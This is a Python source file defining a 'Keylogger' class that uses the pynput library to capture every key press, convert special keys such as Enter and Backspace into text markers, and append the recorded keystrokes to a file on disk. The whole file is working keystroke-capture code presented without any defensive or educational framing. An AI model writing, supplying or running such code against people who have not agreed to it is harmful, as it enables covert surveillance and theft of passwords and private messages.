from pynput.keyboard import Listener, Key

__version__ = "V1"

class Keylogger():

    def __init__(self, path, debug_state):
        
        self.path_to_save_file = path
        self.power_state = False
        self.debug_state = debug_state

        self.data = []
        self.built_data = ""

    def save(self):

        ram_data = ""

        try:
        
            with open(self.path_to_save_file, "a") as save_file:

                for data in self.data:

                    if isinstance(data, str):

                        ram_data += data

                    elif isinstance(data, Key):

                        if data == Key.enter:

                            ram_data += "_ENTER_"

                        elif data == Key.space:

                            ram_data += "_SPACE_"

                        elif data == Key.backspace:

                            ram_data += "_BACKSPACE_"

                        else:

                            ram_data += str(data)

                save_file.write(ram_data)

            if self.debug_state == True:
        
                print("KEYLOGGER: saved data")
        
        except FileNotFoundError:

            print("Error: FileNotFoundError")

        except Exception as key_error:

            print(f"Error: {key_error}")

    def append_data(self, key):

        if hasattr(key, 'char') and key.char:

            self.data.append(key.char)

        else:
            
            self.data.append(key)

    def get_data(self):

        return self.data

    def build_data(self):

        for key in self.data:

            if isinstance(key, str):

                self.built_data += key

                continue
            
            elif isinstance(key, Key):
                    
                match key:

                    case Key.enter:

                        self.built_data += " ENTER "

                    case Key.space:

                        self.built_data += " "

                    case Key.backspace:

                        self.built_data += " BACKSPACE "

                    case Key.shift:

                        self.built_data += " SHIFT "

                    case _:

                        self.built_data += " O-KEY "

            else:
                 
                self.built_data += " NULL "

    def get_built_data(self):

        return self.built_data
    
    def clear_data(self):

        self.data = []
        self.built_data = ""

    def end(self):

        self.power_state = False

    def start(self):

        self.power_state = True

        with Listener(on_press=self.append_data) as listener:

            listener.join()
